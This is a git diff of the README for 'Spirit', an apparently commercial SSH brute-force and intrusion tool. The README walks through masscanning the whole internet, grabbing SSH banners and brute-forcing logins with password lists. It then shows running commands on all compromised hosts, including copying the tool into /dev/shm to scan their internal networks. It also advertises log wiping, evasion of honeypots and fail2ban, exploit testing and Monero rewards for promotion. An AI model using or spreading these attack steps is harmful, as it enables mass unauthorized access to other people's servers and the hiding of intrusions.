@@ -2,10 +2,10 @@
 
 ### [Download the latest Spirit release](https://github.com/theaog/spirit/releases)
 
-> [`$ ./spirit --help`](./HELP) shows you all the included tools commands. \
-some commands have subcommands `./spirit <command> --help`
+> [`$ ./spirit --help`](./HELP) shows you all the included tools. \
+Most commands have subcommands `./spirit <command> --help`
 
-> [Spirit Partner Program](./PARTNER.md)
+> [Spirit Partner Program](./PARTNER.md) -- spread the word, earn XMR.
 
 ## Example usage for SSH brute flow
 ```bash
@@ -18,30 +18,27 @@ $ masscan \
 Scanning 4294967295 hosts [4 ports/host]
 # masscan will create an open.lst file in oG (output Greppable) format.
 
-# Parse open.lst to format the data, so that spirit can understand it.
-$ ./spirit parse open.lst
+# Parse this open.lst to format the data, so that spirit can understand it.
+$ ./spirit parse
 INFO created h.lst in HOST:PORT format
 
-# create a filter.lst file if you want to skip certain SSH versions.
+# Optional: create a filter.lst file if you want to skip certain SSH versions.
 $ cat >filter.lst<< EOF
 SSH-1.0
 SSH-2.0-CISCO
 SSH-2.0-Comware
 EOF
 
-# Test these open ports if they're running SSH by grabbing banners.
-# includes custom designed SSH connection flow.
+# Grab SSH banners to make sure your target version is running on the host. NOTE: Makes a backup of h.lst to h.lst.bak
 $ ./spirit banner
+INFO backing up h.lst to h.lst.bak
 SSH-2.0-OpenSSH_8.2p  13% [=>                  ] [11s:1m15s]
-INFO created b.lst in HOST:PORT:BANNER format
-# spirit created a `b.lst` file containing the hosts running SSH and their banner.
-head -n1 b.lst
+INFO created h.lst in HOST:PORT:BANNER format
+head -n1 h.lst
 100.100.100.100:2222:SSH-2.0-OpenSSH_6.6.1
 
-# Move the banner output (b.lst) to h.lst so spirit will load it automatically for bruting.
-$ mv b.lst h.lst
-
 # Add a password list, spirit will automatically load user:pass from a p.lst file.
+# NOTE: if p.lst is not present, Spirit uses an internal passfile
 $ cat > p.lst << EOF
 user1:pass1
 user1:pass2
@@ -70,7 +67,7 @@ $ ./spirit omni -c 'whoami && uptime'
 $ ./spirit omni -u ./spirit -c '/dev/shm/spirit scan --lan'
 ```
 
-> Tip: you can automate these steps with `./spirit forever` for continuous automatic probing on random ports & bruting. ![forever](asset/forever.png)
+> Tip: you can automate these steps with `./spirit auto-brute` for continuous automatic probing on random ports & bruting. ![forever](asset/forever.png)
 
 ./spirit upgrade
 ## Upgrade Spirit automaticaly
@@ -84,26 +81,26 @@ For `local IP` (10/172/192) ranges and up to 1,000 `public IPs`
 If you need to pen-test more than 1,000 public IP or need Pro features we charge a small fee to help us support the project development. Use `./spirit buy` to upgrade.
 
 ## Spirit Pro
-Buy a Spirit Pro license directly from the CLI `./spirit buy`. Every license helps support our development and server costs. If you want to try a Pro feature, ask for a free Pro trial license by opening an [issue](https://github.com/theaog/spirit/issues).
+Buy a Spirit Pro license directly from the CLI `./spirit buy`. Every license helps support our development and server costs.
 
 ## Key Features
 - extracts SSH banners accurately (retry failed hosts) and fast (many threads)
 - brute multiple ports at once: 1.1.1.1:22, 1.1.1.1:23, etc.
 - brute using private keys `./spirit brute-key --file id_rsa`
-- brute auto-blocks honeypots not wasting time nor giving away all your passwords into them
+- brute auto-blocks honeypots not wasting time nor giving away all your passwords
 - brute also blocks hosts that are unreachable, or have fail2ban installed (less dull work, faster scanning)
 - brute will try every connection twice before blocking unreachable hosts to increase accuracy
 - very light on server load, your CPU will thank you!
-- `./spirit omni -c 'uptime'` connect to all your hosts at once, upload files and execute remote commands
-- `./spirit zap` clean connection logs using 
-- `./spirit masscan --zone zone.lst --rate 10_000` masscan whole zones automatically at your own pace 
-- `./spirit forever` scan & brute your network on random ports over and over -- spot vulnerabilities before they happen
+- `./spirit omni -c 'uptime'` connect to all your found hosts at once, upload files and execute remote commands
+- `./spirit zap` clean connection logs 
+- `./spirit masscan --zone zone.lst --rate 10_000` masscan whole zones automatically 
+- `./spirit auto-brute` scan & brute your network on random ports over and over -- spot vulnerabilities before they happen
 - `./spirit exploit` test targets for common local and remote exploits
 - and more... [`$ ./spirit --help`](./HELP) 
 
 # Support our development
 ## Monero (XMR) thank you! (our favorite)
-`8ATU7h8vJWgJrGHjjG6N9aY69pUsvyFg8WRUxeGPy6jEbcZxRagsWmUN3ZrLpqDqBtHAafTLfnBzCibhvQG3trrNEdGvoTa`
+`895LJnKcfTv7NHf7SN1zz5UzhBRwwvdR8NYLvXNr54jJ3GXghBoyfBKLp2dL4GcYohQatRnigct8zgK6utkjjeBxVNsky1s`
 
 ![xmrqr](asset/xmrqr.png)
 
